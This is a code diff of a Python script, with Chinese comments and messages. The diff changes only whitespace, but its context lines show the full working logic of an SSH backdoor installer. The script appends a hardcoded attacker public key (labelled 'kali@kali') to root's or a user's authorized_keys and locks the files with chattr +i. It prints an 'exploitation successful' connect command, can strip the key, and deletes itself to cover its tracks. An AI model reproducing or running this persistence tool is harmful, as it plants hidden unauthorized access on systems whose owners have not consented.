@@ -2,7 +2,7 @@
 # !/usr/bin/env python
 from __future__ import print_function
 import subprocess
-import sys,os
+import sys, os
 
 
 def ml(command):
@@ -41,9 +41,10 @@ def root_authorized_keys(new_content):
     with open(authorized_keys_file, 'a') as file:
         file.write(new_content + '\n')
 
-def home_authorized_keys(new_content,user):
-    ssh_dir = "/home/"+user+"/.ssh"
-    authorized_keys_file = "/home/"+user+"/.ssh/authorized_keys"
+
+def home_authorized_keys(new_content, user):
+    ssh_dir = "/home/" + user + "/.ssh"
+    authorized_keys_file = "/home/" + user + "/.ssh/authorized_keys"
     # 创建.ssh目录（如果不存在）
     if not os.path.exists(ssh_dir):
         os.makedirs(ssh_dir)
@@ -55,6 +56,7 @@ def home_authorized_keys(new_content,user):
     with open(authorized_keys_file, 'a') as file:
         file.write(new_content + '\n')
 
+
 def file_key(user):
     if 'root' in user:
         file_path = "/" + user + "/.ssh/authorized_keys"
@@ -63,17 +65,19 @@ def file_key(user):
     if os.path.exists(file_path):
         print("文件写入成功")
         print('----->利用成功,生成的用户为:', ml('whoami').strip(), '<-----')
-        print('----->连接命令: ssh -i 密钥文件 '+ str(ml('whoami').strip())+'@ip <-----')
+        print('----->连接命令: ssh -i 密钥文件 ' + str(ml('whoami').strip()) + '@ip <-----')
     else:
         print("文件写入失败")
+
 
 def delete_current_script():
     try:
         script_path = os.path.abspath(sys.argv[0])
         os.remove(script_path)
-        print("当前脚本文件已成功删除"+script_path)
+        print("当前脚本文件已成功删除" + script_path)
     except Exception as e:
         print("无法删除当前脚本文件：", e)
+
 
 def delsshKey(user):
     try:
@@ -82,11 +86,12 @@ def delsshKey(user):
             ml('chattr -i /root/.ssh/authorized_keys')
             ml('rm -rf /root/.ssh/authorized_keys')
         else:
-            ml('chattr -i /home/'+user+'/.ssh')
-            ml('chattr -i /home/'+user+'/.ssh/authorized_keys')
+            ml('chattr -i /home/' + user + '/.ssh')
+            ml('chattr -i /home/' + user + '/.ssh/authorized_keys')
             ml('rm -rf  /home/' + user + '/.ssh/authorized_keys')
     except Exception as e:
         pass
+
 
 if __name__ == '__main__':
     id_ed25519_pub = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIF9OQyvU7TkC4Julezg31Lbj2YB3RSwhmM0yJwwtO4iK kali@kali"
@@ -104,7 +109,7 @@ if __name__ == '__main__':
         root_authorized_keys(id_ed25519_pub)
         ml('chattr +i /root/.ssh && chattr +i /root/.ssh/authorized_keys')
     else:
-        home_authorized_keys(id_ed25519_pub,user)
-        ml('chattr +i /home/'+user+'/.ssh && chattr +i /home/'+user+'/.ssh/authorized_keys')
+        home_authorized_keys(id_ed25519_pub, user)
+        ml('chattr +i /home/' + user + '/.ssh && chattr +i /home/' + user + '/.ssh/authorized_keys')
     file_key(user)
     delete_current_script()  # 删除当前执行脚本文件
